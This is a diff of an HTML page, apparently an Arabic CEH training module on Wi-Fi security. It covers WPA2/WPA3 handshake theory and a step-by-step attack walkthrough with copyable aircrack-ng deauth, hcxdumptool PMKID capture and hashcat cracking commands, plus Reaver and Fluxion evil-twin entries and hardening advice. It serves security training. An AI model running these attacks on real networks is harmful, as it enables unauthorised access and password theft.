@@ -1,70 +1,186 @@
+<div class="meth-content-view" id="meth-content-mod16" style="display: none; --tool-color: #fbbf24;" dir="rtl">
 
-<!-- =======================================================
-     CEH MODULE 16: HACKING WIRELESS NETWORKS
-     ======================================================= -->
-<div class="meth-content-view" id="meth-content-mod16" style="display:none;" dir="rtl">
-  
+  <!-- ═══ SECTION 1: HERO ═══ -->
   <div class="cyber-hero">
-    <h2 class="hero-title"><span class="hero-icon">📶</span> Wireless Networks</h2>
-    <p class="hero-tagline">اختراق الواي فاي: كسر التشفير، الهجمات الجانبية، وأدوات المراقبة المتقدمة.</p>
-    <div class="hero-meta">
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-blue);"></span> Module 16</span>
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    <h2 class="hero-title"><span class="hero-icon">📶</span> Wireless Security Testing — أمن الشبكات اللاسلكية</h2>
+    <p class="hero-tagline">الدليل العملي لكسر تشفير الواي فاي وهجمات التوأم الشرير والتقاط المصافحة وحماية الشبكات</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ aircrack-ng · Reaver · hcxdumptool · Hashcat · Fluxion</span>
+      <span class="badge badge-info">📋 CEH Domain: Wireless Hacking (Weight ~6%)</span>
+      <span style="background: rgba(251,191,36,0.15); color: #fbbf24; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">RF Auditing</span>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">📡</span>
-      <h3>بروتوكولات التشفير والهجمات (Encryption & Attacks)</h3>
-    </div>
-    
-    <div class="goal-cards-grid" dir="rtl">
-      <div class="goal-card">
-        <div class="goal-icon">🔑</div>
-        <h4>WEP Cracking</h4>
-        <div class="goal-subtitle">RC4 Vulnerability</div>
-        <p>يعتمد على 24-bit IV الذي يتكرر بسرعة. يُخترق بهجمات (FMS, PTW, Chopchop) لكسر التشفير خلال دقائق.</p>
-      </div>
-      <div class="goal-card" style="border-color: #ff4757;">
-        <div class="goal-icon" style="color: #ff4757;">🤝</div>
-        <h4 style="color: #ff4757;">WPA/WPA2 Attacks</h4>
-        <div class="goal-subtitle">4-Way Handshake</div>
-        <p>اعتراض الـ Handshake وكسر الباسورد بهجوم القاموس، أو استخدام **PMKID Attack** و **KRACK**.</p>
-      </div>
-      <div class="goal-card">
-        <div class="goal-icon">😈</div>
-        <h4>Evil Twin & Rogue AP</h4>
-        <div class="goal-subtitle">MitM Attack</div>
-        <p>نقطة وصول مزيفة تنتحل (ESSID/BSSID) للشبكة الشرعية، تُستخدم لسرقة البيانات بعد تنفيذ Deauth Attack.</p>
-      </div>
-      <div class="goal-card">
-        <div class="goal-icon">🦷</div>
-        <h4>Bluetooth Hacks</h4>
-        <div class="goal-subtitle">Bluebugging</div>
-        <p>رسائل مزعجة (Bluejacking)، سرقة بيانات (Bluesnarfing)، وسيطرة كاملة على الهاتف (Bluebugging).</p>
+  <!-- ═══ SECTION 2: THEORY — WPA2 vs WPA3 & Handshake ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — تطور بروتوكولات التشفير والـ 4-Way Handshake</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تطورت معايير تشفير شبكات الواي فاي (802.11) لمعالجة الثغرات الأمنية المتراكمة. يعتمد فهم الهجمات اللاسلكية على فهم كيفية تأسيس الاتصال الآمن.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">🤝 آلية WPA2 4-Way Handshake</h4>
+          <p>
+            عند اتصال جهاز بالشبكة، تتم عملية مصافحة رباعية للتحقق من كلمة المرور (Pre-Shared Key - PSK) دون إرسالها على الهواء مباشرة:
+          </p>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Anonce:</strong> يرسل الـ AP قيمة عشوائية (ANonce) إلى العميل.</li>
+            <li><strong>Snonce + MIC:</strong> يقوم العميل بإنشاء قيمة عشوائية (Snonce) ويحسب الـ PTK (Pairwise Transient Key) ويرسل الـ Snonce مع الـ MIC (Message Integrity Code) لتأكيد صحة التشفير.</li>
+            <li><strong>GTK + MIC:</strong> يرسل الـ AP الـ Group Temporal Key مشفراً لتشفير البث الجماعي.</li>
+            <li><strong>ACK:</strong> يرسل العميل تأكيداً (ACK) لبدء إرسال البيانات المشفرة.</li>
+          </ul>
+        </div>
+        <div>
+          <h4 style="color: #ff6e27;">🛡️ WPA3 &amp; SAE (Simultaneous Authentication of Equals)</h4>
+          <p>
+            يقدم <strong>WPA3</strong> حماية جوهرية للتغلب على ثغرات WPA2 الكلاسيكية:
+          </p>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Forward Secrecy:</strong> يمنع فك تشفير البيانات المسجلة مسبقاً حتى لو تم كسر كلمة المرور لاحقاً.</li>
+            <li><strong>SAE Protocol:</strong> يستبدل المصافحة الرباعية ببروتوكول Dragonfly التبادلي لمنع هجمات القاموس أوفلاين (Offline Dictionary Attacks).</li>
+            <li><strong>Protected Management Frames (PMF):</strong> يمنع هجمات إلغاء الاتصال العشوائية (Deauthentication Attacks).</li>
+          </ul>
+        </div>
       </div>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">🛠️</span>
-      <h3>أرسنال الأدوات הلاسلكية (Wireless Arsenal)</h3>
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح الهجوم — Evil Twin &amp; Handshake Capture</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Monitor Mode &amp; Reconnaissance</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">تحويل بطاقة الشبكة اللاسلكية إلى وضع المراقبة (Monitor Mode) للتمكن من الاستماع لكل الحزم التي تمر بالهواء على مختلف القنوات.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Enable Monitor Mode
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+# Sniff and discover networks
+sudo airodump-ng wlan0mon</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Target Sniffing &amp; Deauthentication Attack</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">التركيز على الشبكة المستهدفة وإرسال إشارات طرد (Deauth Frames) للعملاء المتصلين لإجبارهم على إعادة الاتصال والتقاط الـ Handshake.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Focus packet capture on target BSSID and Channel
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake_output wlan0mon
+
+# Send Deauth frames in another terminal to disconnect a client
+sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">WPA2 Offline Cracking (Hashcat)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">تحويل المصافحة الرباعية الملتقطة إلى تنسيق يفهمه Hashcat وتجربة كسر كلمة المرور أوفلاين باستخدام طاقة المعالج الرسومي (GPU).</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Convert cap to hashcat format (using hcxtools)
+hcxpcapngtool -o hash.hc22000 handshake_output-01.cap
+
+# Attack using Hashcat (using GPU)
+hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(80,250,123,0.15); color: #50fa7b; border: 1px solid #50fa7b; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,85,85,0.05); border-right: 3px solid #ff5555; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">4️⃣</span>
+          <div>
+            <strong style="color: #ff5555;">PMKID Attack (Clientless Attack)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">هجوم بدون مستخدمين: يتم التواصل مع نقطة الوصول وسحب الـ PMKID مباشرة من الإطار الأول لمصافحة AP دون الحاجة لانتظار اتصال أي جهاز.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Capture PMKID dynamically
+sudo hcxdumptool -i wlan0 -o pmkid_capture.pcapng --enable_status=1
+
+# Extract PMKID to hash format
+hcxpcapngtool -o pmkid.hc22000 pmkid_capture.pcapng
+
+# Crack PMKID with Hashcat
+hashcat -m 22000 pmkid.hc22000 wordlist.txt</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,85,85,0.15); color: #ff5555; border: 1px solid #ff5555; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+      </div>
     </div>
-    <div class="cyber-card" style="--tool-color: #00e5a0;">
-      <div class="card-header"><h4>Aircrack-ng Suite</h4></div>
-      <p>الأداة الأقوى لاختراق الشبكات. تتكون من (airmon-ng) للمراقبة، (airodump-ng) لالتقاط الحزم، (aireplay-ng) للحقن، و (aircrack-ng) لكسر المفاتيح.</p>
-      <div class="cmd-block">
-        <div class="cmd-header"><span class="cmd-lang">Terminal</span></div>
-        <pre><code># تفعيل وضع المراقبة
-airmon-ng start wlan0
+  </div>
 
-# التقاط مصافحة WPA
-airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
+  <!-- ═══ SECTION 4: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ مقارنة أدوات الاختراق اللاسلكي</h3></div>
+    <div>
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr>
+            <th>الأداة</th>
+            <th>الاستخدام الرئيسي</th>
+            <th>نقاط القوة</th>
+            <th>أمر أساسي</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">Aircrack-ng</strong></td>
+            <td>التقاط وفحص وحقن الحزم وكسر WEP/WPA</td>
+            <td>المعيار الذهبي الكلاسيكي، خفيف وسريع</td>
+            <td><code>airodump-ng wlan0mon</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">hcxdumptool</strong></td>
+            <td>التقاط المصافحات والـ PMKID مباشرة</td>
+            <td>يعمل بدون مستخدمين (Clientless) وحديث جداً</td>
+            <td><code>hcxdumptool -i wlan0 -o out.pcapng</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">Reaver</strong></td>
+            <td>استغلال ثغرة WPS PIN</td>
+            <td>كسر الحماية والحصول على كلمة المرور في ساعات</td>
+            <td><code>reaver -i wlan0mon -b BSSID -vv</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #bd93f9;">Fluxion</strong></td>
+            <td>هجوم التوأم الشرير الاجتماعي (Social Evil Twin)</td>
+            <td>توليد صفحة تسجيل دخول وهمية تطرد العميل وتطلب كلمة السر</td>
+            <td><code>sudo ./fluxion.sh</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
 
-# هجوم Deauth لطرد العميل
-aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon</code></pre>
+  <!-- ═══ SECTION 5: DEFENSE & HARDENING ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تحصين الشبكات اللاسلكية</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ تحصين بيئة الشركات والمنازل</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>Enterprise Mode (802.1X):</strong> استخدام مصادقة الخادم عن طريق RADIUS/TACACS+ بحيث يمتلك كل مستخدم حسابه ورقمه الخاص بدلاً من كلمة مرور واحدة للجميع (PSK).</li>
+          <li><strong>Disable WPS:</strong> إيقاف ميزة WPS (Wi-Fi Protected Setup) بالكامل لمنع هجمات التخمين التلقائي للـ PIN.</li>
+          <li><strong>WPA3 Transition:</strong> الانتقال الفوري لمعيار WPA3 لتفادي هجمات كسر المصافحة الرباعية وإلغاء الاتصال العشوائي.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 الإعدادات والسياسات الآمنة</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>Strong Passphrase:</strong> استخدام كلمة مرور تزيد عن 16 خانة تحتوي على رموز وأرقام وحروف مختلفة لمنع كسرها أوفلاين.</li>
+          <li><strong>Isolation:</strong> عزل شبكات الضيوف (Guest VLAN) عن الشبكة الحيوية للشركة (Internal LAN).</li>
+        </ul>
       </div>
     </div>
   </div>
